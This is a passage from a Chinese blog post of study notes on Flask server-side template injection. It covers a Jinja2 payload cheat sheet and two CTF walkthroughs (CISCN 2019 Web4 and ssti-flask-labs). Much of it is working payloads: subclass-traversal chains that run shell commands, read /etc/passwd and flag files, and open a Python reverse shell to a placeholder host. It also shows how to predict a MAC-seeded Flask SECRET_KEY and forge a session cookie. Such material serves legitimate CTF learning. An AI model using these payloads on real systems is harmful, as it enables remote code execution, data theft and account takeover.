class="keyword">in</span> x.__init__.__globals__ %&#125;</span><br><span class="line">        &#123;&#123; x.__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls /&#x27;</span>).read() &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令执行__frozen_importlib.BuiltinImporter</span></span><br><span class="line">&#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;BuiltinImporter&#x27;</span> <span class="keyword">in</span> x.__name__ %&#125;</span><br><span class="line">        &#123;&#123; x[<span class="string">&quot;load_module&quot;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;ls /&quot;</span>).read() &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令执行_linecache</span></span><br><span class="line">&#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> x.__init__ <span class="keyword">is</span> defined <span class="keyword">and</span> x.__init__.__globals__ <span class="keyword">is</span> defined <span class="keyword">and</span> <span class="string">&#x27;linecache&#x27;</span> <span class="keyword">in</span> x.__init__.__globals__ %&#125;</span><br><span class="line">        &#123;&#123; x.__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>][<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).read() &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令执行_exec(无回显故反弹shell)</span></span><br><span class="line">&#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> x.__init__ <span class="keyword">is</span> defined <span class="keyword">and</span> x.__init__.__globals__ <span class="keyword">is</span> defined <span class="keyword">and</span> <span class="string">&#x27;exec&#x27;</span> <span class="keyword">in</span> x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;exec&#x27;</span>].__name__ %&#125;</span><br><span class="line">        &#123;&#123; x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;exec&#x27;</span>](<span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;HOST_IP&quot;,Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span>)&#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">216</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;exec&#x27;</span>](<span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;VPS_IP&quot;,端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令执行_catch_warnings </span></span><br><span class="line">&#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> <span class="string">&#x27;war&#x27;</span> <span class="keyword">in</span> x.__name__ %&#125;&#123;&#123; x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># catch_warnings 读取文件</span></span><br><span class="line">&#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> x.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/app/flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># _frozen_importlib_external.FileLoader 读取文件</span></span><br><span class="line"> &#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125; <span class="comment"># &#123;% for x in [].__class__.__bases__[0].__subclasses__() %&#125;</span></span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;FileLoader&#x27;</span> <span class="keyword">in</span> x.__name__ %&#125;</span><br><span class="line">        &#123;&#123; x[<span class="string">&quot;get_data&quot;</span>](<span class="number">0</span>,<span class="string">&quot;/etc/passwd&quot;</span>)&#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他RCE</span></span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;g.pop.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;url_for.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;lipsum.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;application.__init__.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="variable language_">self</span>.__init__.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;cycler.__init__.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;joiner.__init__.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;namespace.__init__.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;url_for.__globals__.current_app.add_url_rule(<span class="string">&#x27;/1333337&#x27;</span>,view_func=url_for.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read)&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+<h3 id="识别流程"><a href="#识别流程" class="headerlink" title="识别流程"></a>识别流程</h3><p><img src="https://pic1.imgdb.cn/item/67d43f4088c538a9b5bdb473.png"><br><code>&#123;&#123;7*'7'&#125;&#125;</code>在 Twig 中返回49 ，在 Jinja2 中返回7777777</p>
+<h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.raingray.com<span class="regexp">/archives/</span><span class="number">4183</span>.html</span><br><span class="line">https:<span class="regexp">//</span>xz.aliyun.com<span class="regexp">/t/</span><span class="number">11090</span><span class="comment">#toc-6</span></span><br><span class="line">https:<span class="regexp">//</span>xz.aliyun.com<span class="regexp">/t/</span><span class="number">9584</span><span class="comment">#toc-6</span></span><br><span class="line">https:<span class="regexp">//</span>zhuanlan.zhihu.com<span class="regexp">/p/</span><span class="number">618277583</span></span><br><span class="line">https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/2301_77485708/</span>article<span class="regexp">/details/</span><span class="number">132467976</span></span><br><span class="line">https:<span class="regexp">//</span>cloud.tencent.com<span class="regexp">/developer/</span>article/<span class="number">2287431</span></span><br><span class="line">https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/Manuffer/</span>article<span class="regexp">/details/</span><span class="number">120739989</span></span><br><span class="line">https:<span class="regexp">//</span>tttang.com<span class="regexp">/hc-archive1698/</span><span class="comment">#toc__5</span></span><br><span class="line">https:<span class="regexp">//</span>jinja.palletsprojects.com<span class="regexp">/en/</span>latest<span class="regexp">/templates/</span></span><br><span class="line">https:<span class="regexp">//</span>docs.python.org<span class="regexp">/zh-cn/</span><span class="number">3</span><span class="regexp">/library/</span>functions.html</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="nssctf-CISCN-2019华东南-Web4"><a href="#nssctf-CISCN-2019华东南-Web4" class="headerlink" title="nssctf  [CISCN 2019华东南]Web4"></a>nssctf  [CISCN 2019华东南]Web4</h2><p><img src="https://pic1.imgdb.cn/item/67d4300f88c538a9b5bdb014.png"><br>发现这里是用&#x2F;read?url&#x3D;xxx 可以先验证有没有任意文件读取漏洞, 用&#x2F;etc&#x2F;passwd尝试发现真的有<br>然后输入&#x2F;proc&#x2F;self&#x2F;cmdline 这个文件是读取当前进程的命令 返回<code>/usr/local/bin/python/app/app.py</code> 说明这个是一个flask框架的题目<br>这个read功能也是一个路由，访问app.py只要url中输入app.py，得到源码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置随机种子</span></span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! Read somethings&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">r&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">r&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line"></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session.get(<span class="string">&#x27;username&#x27;</span>) == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+<p><code>/</code>路由中会设置<code>session[&#39;username&#39;] = &#39;www-data&#39;</code> flag路由中如果session中的username是fuck就能得到flag<br>uuid.getnode()这个函数是获取mac地址 但是随机种子一般是个位数，然后把数据转成十六进制<br>在&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address中得到mac地址 <code>02:42:ac:02:56:ed</code> -&gt; <code>0x0242ac0256ed</code><br>但是要注意用python2执行，得到SECRET_KEY</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"></span><br><span class="line">random.seed(<span class="number">0x0242ac0256ed</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(random.random() * <span class="number">233</span>))<span class="comment">#176.896276856</span></span><br></pre></td></tr></table></figure></div>
+<p>然后用flask-session-cookie-manager工具生成session值</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(base) kakeru@bogon flask-session-cookie-manager-<span class="keyword">master</span> <span class="title">% python3</span> flask_session_cookie_manager3.py encode -s <span class="number">176.896276856</span> -t <span class="string">&quot;&#123;&#x27;username&#x27;:&#x27;fuck&#x27;&#125;&quot;</span></span><br><span class="line">eyJ1c2VybmFtZSI6ImZ1Y2sifQ.Z9Q02Q.BwRGhQnimBzqix5uXVI21w1xL_0</span><br></pre></td></tr></table></figure></div>
+<p>把网页中的session值修改成这个，然后访问flag路由得到flag<br><img src="https://pic1.imgdb.cn/item/67d4353588c538a9b5bdb15c.png"></p>
+<h2 id="nssctf-ssti-flask-labs"><a href="#nssctf-ssti-flask-labs" class="headerlink" title="nssctf ssti-flask-labs"></a>nssctf ssti-flask-labs</h2><p><img src="https://pic1.imgdb.cn/item/67d441d088c538a9b5bdb528.png"><br>这就是一个ssti的靶场，可以练习不同的ssti的绕过姿势<br>从最简单的没有waf开始，就是直接用刚才的通用payload，遍历找到一个有eval的内建函数，然后调用eval就可以了</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> x.__init__ <span class="keyword">is</span> defined <span class="keyword">and</span> x.__init__.__globals__ <span class="keyword">is</span> defined <span class="keyword">and</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>].__name__ %&#125;</span><br><span class="line">        &#123;&#123; x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></div>
+<p>还可以用下面这个命令来爆破出是subclasses中的哪一个，便于下面的过滤</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HANDLEBARS"><figure class="iseeu highlight /handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[x].__init__.__globals__[&#x27;__import__&#x27;](<span class="name">&#x27;os&#x27;</span>).popen(<span class="name">&#x27;env&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> </span></span><br><span class="line"><span class="language-xml">#相当于执行 import os; os.popen(&#x27;env&#x27;)</span></span><br></pre></td></tr></table></figure></div>
+<p>总结下后面的过滤姿势</p>
+<ul>
+<li>过滤&#96;</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/53614.html" title="flask框架&amp;&amp;ssti学习笔记">https://guayu-kakeru.github.io/posts/53614.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"># 笔记</a>
+              <a href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag"># 漏洞</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/29573.html" rel="prev" title="HMV-up">
+      <i class="fa fa-chevron-left"></i> HMV-up
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFflask%E6%A1%86%E6%9E%B6"><span class="nav-text">什么是flask框架</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#flask%E7%AE%80%E4%BB%8B"><span class="nav-text">flask简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1%E5%92%8C%E8%AF%95%E5%9B%BE%E5%87%BD%E6%95%B0"><span class="nav-text">路由和试图函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0"><span class="nav-text">常见函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81%E4%B9%8BHTTP%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95"><span class="nav-text">登录验证之HTTP请求方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BFjinja2"><span class="nav-text">模板jinja2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFJinja2%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"><span class="nav-text">什么是Jinja2模板引擎?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%AD%E6%B3%95"><span class="nav-text">语法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ssti"><span class="nav-text">ssti</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF"><span class="nav-text">模板</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B"><span class="nav-text">一般流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%BF%E5%9F%BA%E7%B1%BB"><span class="nav-text">拿基类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E5%AD%90%E7%B1%BB"><span class="nav-text">寻找子类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-text">文件读取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%A2%E7%B4%A2"><span class="nav-text">探索</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Jinja-SSTI-%E5%A4%87%E5%BF%98%E5%BD%95"><span class="nav-text">Jinja SSTI 备忘录</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%B1%BB"><span class="nav-text">基类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E7%94%A8-payload-Python3"><span class="nav-text">通用 payload ( Python3 )</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%86%E5%88%AB%E6%B5%81%E7%A8%8B"><span class="nav-text">识别流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="nav-text">过滤器</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#nssctf-CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Web4"><span class="nav-text">nssctf  [CISCN 2019华东南]Web4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nssctf-ssti-flask-labs"><span class="nav-text">nssctf ssti-flask-labs</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">64</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayu-kakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayu-kakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/53614.html" title="posts&#x2F;53614.html">flask框架&&ssti学习笔记</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/29573.html" title="posts&#x2F;29573.html">HMV-up</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/36666.html" title="posts&#x2F;36666.html">moectf_2024web</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/50762.html" title="posts&#x2F;50762.html">HMV-Driftingblues</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/6117.html" title="posts&#x2F;6117.html">HMV-family3</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
